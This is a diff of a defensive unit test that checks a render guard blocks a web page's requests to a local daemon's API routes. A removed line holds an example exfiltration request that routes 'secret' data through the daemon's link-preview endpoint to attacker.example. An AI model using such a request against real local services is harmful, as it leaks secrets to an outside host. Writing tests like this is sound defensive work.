@@ -196,14 +196,14 @@ describe("checkRender", () => {
 	});
 
 	it("keeps the page off the daemon's other routes, whose host and port the proxy lets through", async () => {
-		const linkPreview = "http://127.0.0.1:3001/api/v1/link-preview?url=https://attacker.example/?d=secret";
-		const f = fakes({ requests: [url, linkPreview, "https://cdn.example/d3.js"] });
+		const daemonApi = "http://127.0.0.1:3001/api/v1/automations?secret=1";
+		const f = fakes({ requests: [url, daemonApi, "https://cdn.example/d3.js"] });
 		const result = await checkRender(f as never, { url, width: 390, network: "none" });
 		// Public addresses are the proxy's to refuse; the guard only holds the daemon to the page.
-		expect(f.cancelled).toEqual({ [url]: false, [linkPreview]: true, "https://cdn.example/d3.js": false });
+		expect(f.cancelled).toEqual({ [url]: false, [daemonApi]: true, "https://cdn.example/d3.js": false });
 		expect(result.consoleMessages[0]).toEqual({
 			level: "warning",
-			text: "AO blocked a request to 127.0.0.1:3001/api/v1/link-preview. The agent has no network access, so the check loads no network resources.",
+			text: "AO blocked a request to 127.0.0.1:3001/api/v1/automations. The agent has no network access, so the check loads no network resources.",
 		});
 	});
 
